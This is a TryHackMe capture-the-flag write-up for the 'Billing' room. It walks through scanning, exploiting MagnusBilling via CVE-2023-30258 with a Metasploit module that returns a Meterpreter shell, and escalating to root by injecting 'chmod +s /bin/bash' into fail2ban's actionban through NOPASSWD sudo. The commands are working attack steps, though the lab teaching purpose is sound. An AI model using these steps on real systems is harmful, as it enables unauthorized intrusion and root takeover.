# 🛡️ TryHackMe – Billing - Writeup

## 📌 Overview
**Room Name:** Billing  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Exploitation / RCE / Privilege Escalation

Linux machine running MagnusBilling. Unauthenticated RCE via CVE-2023-30258, escalated to root through a misconfigured `fail2ban-client` sudo entry.

The attack chain involves:

- Port scanning revealing SSH, HTTP (MagnusBilling), MySQL, and Asterisk AMI
- MagnusBilling identified by name → CVE-2023-30258 (unauthenticated RCE, CVSS 10.0)
- Metasploit module to obtain a Meterpreter shell
- Privilege escalation via `fail2ban-client` NOPASSWD sudo by injecting a malicious `actionban`

---

## 🔍 1. Enumeration

### 🔎 Port Scanning

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian
80/tcp   open  http     Apache/2.4.62 (MagnusBilling)
3306/tcp open  mysql    MariaDB
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

### 🌐 Web Application Fingerprinting
Browsing to port 80 revealed **MagnusBilling** running at `/mbilling/`. Attempted to extract the version via headers and HTML source:

```bash
curl -I http://<TARGET_IP>/mbilling/
curl -s http://<TARGET_IP>/mbilling/ | grep -i "version"
```

No explicit version was found, but the application name was clearly identified — sufficient to search for known CVEs.

### 📞 Asterisk AMI (Port 5038)
Attempted direct connection to the Asterisk Manager Interface with default credentials:

```bash
telnet <TARGET_IP> 5038
# Login: admin / admin → Authentication failed
```

Direct AMI access was ruled out. Since MagnusBilling sits on top of Asterisk and manages it, attacking the web layer was the more effective approach.

---

## 🔓 2. Initial Access

### 💀 CVE-2023-30258 — MagnusBilling Unauthenticated RCE
With the application name confirmed, a search for known vulnerabilities revealed **CVE-2023-30258**: an unauthenticated Remote Code Execution vulnerability with a CVSS score of **10.0**. A Metasploit module was available.

> **Thought process:** Fixed software name identified → search CVEs → unauthenticated RCE with CVSS 10.0 found → Metasploit module available → highest priority target before attempting manual exploitation.

```bash
msfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS <TARGET_IP>
set LHOST <KALI_IP>
run
```

Meterpreter session obtained. ✅

### 🔧 Shell Stabilization
Dropped into a system shell and stabilized with a PTY:

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Initial access as `asterisk` achieved.** ✅

---

## 👑 3. Privilege Escalation: asterisk → root

### 🔍 Sudo Enumeration

```bash
sudo -l
```

```text
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

`fail2ban-client` can be executed as root without a password.

### 🔎 Understanding the Attack Surface
Fail2Ban is an intrusion prevention tool that monitors logs and bans IPs exhibiting suspicious behaviour. When a ban is triggered, it executes a command defined in `actionban` — and since Fail2Ban runs as root, `actionban` is also executed as root.

By using `fail2ban-client` with sudo, `actionban` can be overwritten with an arbitrary command, then a ban can be triggered to execute it as root:

```
(ALL) NOPASSWD: fail2ban-client
        ↓
actionban executed as root
        ↓
overwrite actionban → chmod +s /bin/bash
        ↓
trigger ban → SUID set on /bin/bash
        ↓
/bin/bash -p → root shell
```

### 💥 Exploitation

```bash
# Step 1: Restart fail2ban for a clean state
sudo fail2ban-client restart

# Step 2: Overwrite actionban with malicious command
sudo fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"

# Step 3: Trigger a ban to execute actionban as root
sudo fail2ban-client set sshd banip 127.0.0.1

# Step 4: Confirm SUID bit was set
ls -la /bin/bash
# -rwsr-sr-x 1 root root ...

# Step 5: Spawn root shell
/bin/bash -p
id
# uid=1000(asterisk) gid=1000(asterisk) euid=0(root)
```

**ROOT ACCESS GRANTED.** ✅

---

## 📚 Key Takeaways

- 🔍 **When the software name is known, look for CVEs immediately:** Once MagnusBilling was identified by name, searching for its CVEs was the right first move — even without knowing the exact version. A CVSS 10.0 unauthenticated RCE should always be prioritised over manual testing.

- 📞 **Attack the management layer, not the service directly:** Asterisk AMI sits behind MagnusBilling. Attempting to brute-force AMI credentials directly is less efficient than exploiting the web application that controls it.

- 🔑 **`sudo -l` is always the first post-exploitation step:** Any NOPASSWD entry is a potential escalation path. The key is understanding what that binary can *do* as root, not just whether it exists.

- 🛡️ **Security tools can become attack vectors:** Fail2Ban is a defensive tool, yet a misconfigured sudo permission on `fail2ban-client` turned it into a direct path to root. The principle of least privilege applies to security software too.

---

## 🛠️ Tools Used

- `rustscan`
- `curl`
- `telnet`
- `metasploit` (`exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`)
- `python3` (PTY stabilization)
- `fail2ban-client`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
